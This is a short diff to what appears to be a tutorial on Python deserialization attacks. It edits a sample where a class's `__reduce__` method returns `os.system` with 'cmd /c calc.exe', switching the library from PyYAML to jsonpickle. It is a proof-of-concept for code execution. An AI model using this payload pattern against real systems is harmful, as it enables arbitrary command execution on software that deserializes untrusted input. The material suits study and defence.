@@ -1929,13 +1929,13 @@ Call to loadclass on line 600 of C:\Users\amagnosi\PycharmProjects\PayloadGenera
 As for the previous two modules, the serialization process uses `__reduce__` to create the serialized representation of the object. Generate a working exploit is as easy as it was for PyYAML, and can be done using the following code:
 
 ```python
-import yaml
+import jsonpickle
 
 class Payload:
     def __reduce__(self):
         return (os.system, ("cmd /c calc.exe",))
     
-yaml.load(Payload())
+jsonpickle.encode(Payload())
 ```
 
 Ok, that's seems interesting, but still we would like to generate our serialized payloads without rewriting the code anytime we need to issue a different command, right? So, last but not least, we'll explore a way to dynamically generate valid payloads for all the python modules we saw above.
